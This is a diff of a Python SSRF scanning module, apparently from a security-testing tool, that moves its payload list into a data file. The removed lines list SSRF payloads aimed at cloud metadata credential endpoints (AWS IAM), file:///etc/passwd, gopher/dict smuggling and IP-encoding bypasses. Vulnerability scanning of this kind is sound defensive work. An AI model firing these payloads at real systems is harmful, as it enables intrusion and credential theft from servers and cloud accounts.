@@ -4,38 +4,13 @@ import asyncio
 import logging
 from typing import Any
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+from ._payload_loader import load_skill_dataset as _load_ds
 
 logger = logging.getLogger(__name__)
 
-SSRF_PAYLOADS: list[dict[str, str]] = [
-    # Internal IPs
-    {"payload": "http://127.0.0.1/", "detect": "", "desc": "Localhost IPv4"},
-    {"payload": "http://localhost/", "detect": "", "desc": "Localhost hostname"},
-    {"payload": "http://[::1]/", "detect": "", "desc": "Localhost IPv6"},
-    {"payload": "http://0.0.0.0/", "detect": "", "desc": "All-interfaces IP"},
-    {"payload": "http://10.0.0.1/", "detect": "", "desc": "Private 10.x"},
-    {"payload": "http://192.168.1.1/", "detect": "", "desc": "Private 192.168.x"},
-    {"payload": "http://172.16.0.1/", "detect": "", "desc": "Private 172.16.x"},
-    # Cloud metadata
-    {"payload": "http://169.254.169.254/latest/meta-data/", "detect": "ami-", "desc": "AWS metadata"},
-    {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "detect": "AccessKeyId", "desc": "AWS IAM creds"},
-    {"payload": "http://metadata.google.internal/computeMetadata/v1/", "detect": "", "desc": "GCP metadata"},
-    {"payload": "http://169.254.169.254/metadata/v1/", "detect": "", "desc": "DigitalOcean metadata"},
-    {"payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "detect": "", "desc": "Azure metadata"},
-    # Protocol smuggling
-    {"payload": "file:///etc/passwd", "detect": "root:", "desc": "Local file read"},
-    {"payload": "file:///etc/hostname", "detect": "", "desc": "Hostname read"},
-    {"payload": "gopher://127.0.0.1:25/", "detect": "", "desc": "Gopher SMTP"},
-    {"payload": "dict://127.0.0.1:6379/INFO", "detect": "redis", "desc": "Redis via dict"},
-    # Bypass patterns
-    {"payload": "http://0x7f000001/", "detect": "", "desc": "Hex IP bypass"},
-    {"payload": "http://2130706433/", "detect": "", "desc": "Decimal IP bypass"},
-    {"payload": "http://127.1/", "detect": "", "desc": "Short IP bypass"},
-    {"payload": "http://127.0.0.1.nip.io/", "detect": "", "desc": "DNS rebinding"},
-    # --- AUTO-UPDATED PAYLOADS BELOW (managed by growth pipeline) ---
-]
+SSRF_PAYLOADS = _load_ds("test_ssrf", "ssrf_payloads")  # ADR-007 Phase 3-9 — data in data/payloads/test_ssrf.json
 
-URL_PARAMS = ["url", "uri", "path", "redirect", "next", "link", "src", "href", "file", "page", "callback"]
+URL_PARAMS = _load_ds("test_ssrf", "url_params")  # ADR-007 Phase 3-9 — data in data/payloads/test_ssrf.json
 
 
 async def execute(url: str, param_name: str | None = None, **kwargs: Any) -> dict[str, Any]:
@@ -44,7 +19,11 @@ async def execute(url: str, param_name: str | None = None, **kwargs: Any) -> dic
     Returns:
         {"vulnerable": bool, "findings": [...], "tested": int, "url": str}
     """
-    import httpx
+    from urllib.parse import urlparse as _urlparse
+    from vxis.interaction.hands import SessionManager
+
+    _base = _urlparse(url)
+    _base_url = f"{_base.scheme}://{_base.netloc}"
 
     parsed = urlparse(url)
     params = parse_qs(parsed.query, keep_blank_values=True)
@@ -68,59 +47,61 @@ async def execute(url: str, param_name: str | None = None, **kwargs: Any) -> dic
     tested = 0
     sem = asyncio.Semaphore(15)
 
-    async with httpx.AsyncClient(timeout=10, verify=False) as client:
-        # Get baseline
-        try:
-            base_r = await client.get(url)
-            baseline_size = len(base_r.content)
-            baseline_status = base_r.status_code
-        except Exception as e:
-            return {"vulnerable": False, "findings": [], "tested": 0, "url": url, "error": str(e)}
+    _mgr = SessionManager()
+    _session = await _mgr.get_session(_base_url)
 
-        async def test_payload(p: dict[str, str]) -> None:
-            nonlocal tested
-            async with sem:
-                tested += 1
-                new_params = dict(params)
-                new_params[target_param] = [p["payload"]]
-                query = urlencode({k: v[0] for k, v in new_params.items()})
-                test_url = urlunparse(parsed._replace(query=query))
+    # Get baseline
+    try:
+        base_r = await _session.request("GET", url)
+        baseline_size = base_r.body_length
+        baseline_status = base_r.status
+    except Exception as e:
+        return {"vulnerable": False, "findings": [], "tested": 0, "url": url, "error": str(e)}
 
-                try:
-                    r = await client.get(test_url, timeout=10)
-                except Exception:
-                    return
+    async def test_payload(p: dict[str, str]) -> None:
+        nonlocal tested
+        async with sem:
+            tested += 1
+            new_params = dict(params)
+            new_params[target_param] = [p["payload"]]
+            query = urlencode({k: v[0] for k, v in new_params.items()})
+            test_url = urlunparse(parsed._replace(query=query))
 
-                body = r.text.lower()
-                size = len(r.content)
+            try:
+                r = await _session.request("GET", test_url)
+            except Exception:
+                return
 
-                # Signature detection
-                if p["detect"] and p["detect"].lower() in body:
-                    findings.append({
-                        "type": "ssrf",
-                        "payload": p["payload"],
-                        "param": target_param,
-                        "desc": p["desc"],
-                        "evidence": f"Detected '{p['detect']}' in response (status {r.status_code})",
-                        "response_preview": r.text[:300],
-                        "severity": "critical",
-                    })
-                    logger.info("SSRF found: %s via %s", p["desc"], target_param)
-                    return
+            body = r.text.lower()
+            size = r.body_length
 
-                # Size difference heuristic (might indicate internal response)
-                if size > baseline_size + 200 and r.status_code == 200:
-                    findings.append({
-                        "type": "ssrf_possible",
-                        "payload": p["payload"],
-                        "param": target_param,
-                        "desc": p["desc"],
-                        "evidence": f"Response size {size} vs baseline {baseline_size} (status {r.status_code})",
-                        "response_preview": r.text[:300],
-                        "severity": "high",
-                    })
+            # Signature detection
+            if p["detect"] and p["detect"].lower() in body:
+                findings.append({
+                    "type": "ssrf",
+                    "payload": p["payload"],
+                    "param": target_param,
+                    "desc": p["desc"],
+                    "evidence": f"Detected '{p['detect']}' in response (status {r.status})",
+                    "response_preview": r.text[:300],
+                    "severity": "critical",
+                })
+                logger.info("SSRF found: %s via %s", p["desc"], target_param)
+                return
 
-        await asyncio.gather(*[test_payload(p) for p in SSRF_PAYLOADS])
+            # Size difference heuristic (might indicate internal response)
+            if size > baseline_size + 200 and r.status == 200:
+                findings.append({
+                    "type": "ssrf_possible",
+                    "payload": p["payload"],
+                    "param": target_param,
+                    "desc": p["desc"],
+                    "evidence": f"Response size {size} vs baseline {baseline_size} (status {r.status})",
+                    "response_preview": r.text[:300],
+                    "severity": "high",
+                })
+
+    await asyncio.gather(*[test_payload(p) for p in SSRF_PAYLOADS])
 
     # Deduplicate
     seen: set[str] = set()
